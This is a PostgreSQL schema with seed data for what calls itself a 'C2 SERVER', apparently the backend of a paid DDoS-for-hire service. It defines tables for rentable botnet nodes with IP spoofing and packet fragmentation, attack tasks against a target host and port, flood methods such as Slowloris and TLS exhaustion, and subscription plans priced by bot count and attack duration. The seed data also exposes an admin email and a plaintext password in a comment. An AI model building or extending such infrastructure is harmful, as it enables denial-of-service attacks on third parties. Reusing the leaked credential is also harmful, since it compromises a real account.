-- ============================================================
-- C2 SERVER v4.0.49 — Full Schema
-- Telegram auth, SiteSettings, Plan CRUD, FK CASCADE
-- ============================================================

CREATE TABLE users (
    id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    username        VARCHAR(64) UNIQUE NOT NULL,
    email           VARCHAR(255) UNIQUE,
    password_hash   VARCHAR(255) NOT NULL,
    role            VARCHAR(16) DEFAULT 'user',
    telegram_id     BIGINT UNIQUE,
    api_key         VARCHAR(128) UNIQUE,
    credit_balance  DECIMAL(10,2) DEFAULT 0.00,
    is_banned       BOOLEAN DEFAULT FALSE,
    created_at      TIMESTAMPTZ DEFAULT NOW(),
    last_login_at   TIMESTAMPTZ
);

-- ── Plans ──────────────────────────────────────
CREATE TABLE plans (
    id                  UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    name                VARCHAR(64) NOT NULL,
    slug                VARCHAR(32) UNIQUE NOT NULL,
    description         TEXT,
    max_bots            INT NOT NULL DEFAULT 1,
    max_concurrent      INT NOT NULL DEFAULT 1,
    max_attack_secs     INT NOT NULL DEFAULT 120,
    cooldown_secs       INT NOT NULL DEFAULT 300,
    max_pps_per_bot     INT NOT NULL DEFAULT 500000,
    allowed_methods     TEXT[] DEFAULT '{PSPE,TCP,TLS,HTTP,GAME,MYSQL}',
    price_vnd           INT NOT NULL DEFAULT 10000,
    price_usd           DECIMAL(10,2) NOT NULL DEFAULT 0.50,
    is_active           BOOLEAN DEFAULT TRUE,
    created_at          TIMESTAMPTZ DEFAULT NOW()
);

-- ── User Subscriptions ─────────────────────────
CREATE TABLE user_subscriptions (
    id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id     UUID REFERENCES users(id) ON DELETE CASCADE,
    plan_id     UUID REFERENCES plans(id),
    status      VARCHAR(16) DEFAULT 'active',
    started_at  TIMESTAMPTZ DEFAULT NOW(),
    expires_at  TIMESTAMPTZ,
    auto_renew  BOOLEAN DEFAULT FALSE,
    payment_id  VARCHAR(128)
);

-- ── Payments ───────────────────────────────────
CREATE TABLE payments (
    id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id         UUID REFERENCES users(id) ON DELETE CASCADE,
    amount_vnd      INT NOT NULL,
    amount_usd      DECIMAL(10,2),
    method          VARCHAR(32) NOT NULL,
    status          VARCHAR(16) DEFAULT 'pending',
    tx_ref          VARCHAR(128) UNIQUE,
    payment_url     TEXT,
    metadata        JSONB DEFAULT '{}',
    created_at      TIMESTAMPTZ DEFAULT NOW(),
    completed_at    TIMESTAMPTZ
);

-- ── Bots ───────────────────────────────────────
CREATE TABLE bots (
    id                  UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    bot_identifier      VARCHAR(128) UNIQUE NOT NULL,
    nickname            VARCHAR(64),
    ip_address          INET,
    country             VARCHAR(2),
    isp                 VARCHAR(255),
    os_name             VARCHAR(64) DEFAULT 'Linux',
    cpu_cores           INT,
    ram_total_mb        INT,
    net_speed_mbps      INT,
    status              VARCHAR(16) DEFAULT 'offline',
    is_rented           BOOLEAN DEFAULT FALSE,
    rented_by_user_id   UUID REFERENCES users(id) ON DELETE SET NULL,
    rental_expires_at   TIMESTAMPTZ,
    max_pps             INT DEFAULT 50000000,
    max_mbps            INT DEFAULT 1000,
    max_threads         INT DEFAULT 10000,
    enabled_methods     TEXT[] DEFAULT '{MEGA,TLS_EXHAUST,HTTP,SLOWLORIS,GAME}',
    spoof_mode          INT DEFAULT 0,
    fragmentation       BOOLEAN DEFAULT FALSE,
    last_heartbeat_at   TIMESTAMPTZ,
    first_seen_at       TIMESTAMPTZ DEFAULT NOW(),
    bot_version         VARCHAR(16) DEFAULT '4.0.0'
);

CREATE INDEX idx_bots_status ON bots(status);
CREATE INDEX idx_bots_rented ON bots(is_rented) WHERE is_rented = TRUE;

-- ── Attack Tasks ───────────────────────────────
CREATE TABLE attack_tasks (
    id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id         UUID REFERENCES users(id) ON DELETE CASCADE,
    target_host     VARCHAR(255) NOT NULL,
    target_port     INT NOT NULL,
    method          VARCHAR(16) NOT NULL,
    duration_secs   INT NOT NULL,
    pps_per_bot     INT DEFAULT 100000,
    spoof_mode      INT DEFAULT 0,
    fragmentation   BOOLEAN DEFAULT FALSE,
    slowloris       BOOLEAN DEFAULT FALSE,
    tls_exhaust     BOOLEAN DEFAULT FALSE,
    mega_mode       BOOLEAN DEFAULT FALSE,
    status          VARCHAR(16) DEFAULT 'pending',
    bot_ids         UUID[] DEFAULT '{}',
    total_packets   BIGINT DEFAULT 0,
    total_bytes     BIGINT DEFAULT 0,
    started_at      TIMESTAMPTZ,
    completed_at    TIMESTAMPTZ,
    created_at      TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX idx_tasks_status ON attack_tasks(status);

-- ── Attack Logs (CASCADE on bot_id + task_id) ──
CREATE TABLE attack_logs (
    id            BIGSERIAL PRIMARY KEY,
    task_id       UUID REFERENCES attack_tasks(id) ON DELETE CASCADE,
    bot_id        UUID REFERENCES bots(id) ON DELETE CASCADE,
    packets_sent  BIGINT DEFAULT 0,
    bytes_sent    BIGINT DEFAULT 0,
    started_at    TIMESTAMPTZ,
    ended_at     TIMESTAMPTZ
);

-- ── Admin Logs (SET NULL on admin delete) ─────
CREATE TABLE admin_logs (
    id          BIGSERIAL PRIMARY KEY,
    admin_id    UUID REFERENCES users(id) ON DELETE SET NULL,
    action      VARCHAR(128) NOT NULL,
    target_type VARCHAR(64),
    target_id   UUID,
    details     JSONB DEFAULT '{}',
    created_at  TIMESTAMPTZ DEFAULT NOW()
);

-- ── Telegram Sessions (login_code + CASCADE) ──
CREATE TABLE telegram_sessions (
    id                  UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id             UUID REFERENCES users(id) ON DELETE CASCADE UNIQUE,
    chat_id             BIGINT NOT NULL,
    state               VARCHAR(32) DEFAULT 'idle',
    data                JSONB DEFAULT '{}',
    login_code          VARCHAR(32),
    login_code_expires  TIMESTAMPTZ,
    created_at          TIMESTAMPTZ DEFAULT NOW()
);

-- ── Site Settings (bank, site config) ─────────
CREATE TABLE site_settings (
    id                      INTEGER PRIMARY KEY DEFAULT 1,
    site_name               VARCHAR(128) DEFAULT 'C2 Command Center',
    site_url                VARCHAR(255) DEFAULT '',
    telegram_bot_username   VARCHAR(64) DEFAULT '',
    bank_account_name       VARCHAR(255) DEFAULT '',
    bank_account_number     VARCHAR(32) DEFAULT '',
    bank_name               VARCHAR(64) DEFAULT 'MBBank',
    bank_bin                VARCHAR(16) DEFAULT '970422',
    min_deposit             INT DEFAULT 10000,
    maintenance_mode        BOOLEAN DEFAULT FALSE,
    discord_webhook_url     VARCHAR(255) DEFAULT '',
    updated_at              TIMESTAMPTZ DEFAULT NOW()
);

-- ── MB Bank Sessions (persistent) ─────────────
CREATE TABLE mb_sessions (
    id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    device_id   VARCHAR(128) UNIQUE NOT NULL,
    session_id  VARCHAR(128),
    token       TEXT,
    cookie      TEXT,
    account_no  VARCHAR(32),
    last_login  TIMESTAMPTZ DEFAULT NOW(),
    extra       JSONB DEFAULT '{}'
);

-- ── Attack Templates (user presets) ───────────
CREATE TABLE attack_templates (
    id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id         UUID REFERENCES users(id) ON DELETE CASCADE,
    name            VARCHAR(64) NOT NULL,
    target_host     VARCHAR(255) NOT NULL,
    target_port     INT NOT NULL DEFAULT 80,
    method          VARCHAR(16) NOT NULL DEFAULT 'MEGA',
    duration_secs   INT DEFAULT 60,
    bot_count       INT DEFAULT 1,
    created_at      TIMESTAMPTZ DEFAULT NOW()
);

-- ── Attack Queue (waiting for bots) ───────────
CREATE TABLE attack_queue (
    id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id         UUID REFERENCES users(id) ON DELETE CASCADE,
    target_host     VARCHAR(255) NOT NULL,
    target_port     INT NOT NULL,
    method          VARCHAR(16) NOT NULL,
    duration_secs   INT NOT NULL,
    pps_per_bot     INT DEFAULT 100000,
    bot_count       INT DEFAULT 1,
    status          VARCHAR(16) DEFAULT 'queued',
    task_id         UUID REFERENCES attack_tasks(id) ON DELETE SET NULL,
    created_at      TIMESTAMPTZ DEFAULT NOW(),
    started_at      TIMESTAMPTZ
);

CREATE INDEX idx_queue_status ON attack_queue(status);

-- ============================================================
-- SEED DATA
-- ============================================================

-- Admin: miu2k3a@gmail.com / admin123 (email+password+code login)
INSERT INTO users (username, email, password_hash, role) VALUES
('admin', 'miu2k3a@gmail.com', '$2b$12$iw2ihlUINYafpVjXjgdujOijqGp4B9fPq7A5c97PPHr6jEx5N8C4G', 'admin')
ON CONFLICT DO NOTHING;

-- Default site settings
INSERT INTO site_settings (id) VALUES (1) ON CONFLICT DO NOTHING;

-- Plans (updated methods, durations, pricing)
INSERT INTO plans (name, slug, description, max_bots, max_concurrent, max_attack_secs, cooldown_secs, max_pps_per_bot, allowed_methods, price_vnd, price_usd) VALUES
('Starter',    'starter',    '3 bot, 120s — PSPE+TCP+TLS',     3,  1,  120, 300,  500000,  '{PSPE,TCP,TLS}',                    10000,  0.40),
('Pro',        'pro',        '10 bot, 240s — full methods',    10, 3,  240, 120, 1000000, '{PSPE,TCP,TLS,HTTP,GAME,MYSQL}',    50000,  2.00),
('Enterprise', 'enterprise', '20 bot, 360s — full methods',    20, 10, 360,  30, 5000000, '{PSPE,TCP,TLS,HTTP,GAME,MYSQL}',   100000, 5.00)
ON CONFLICT DO NOTHING;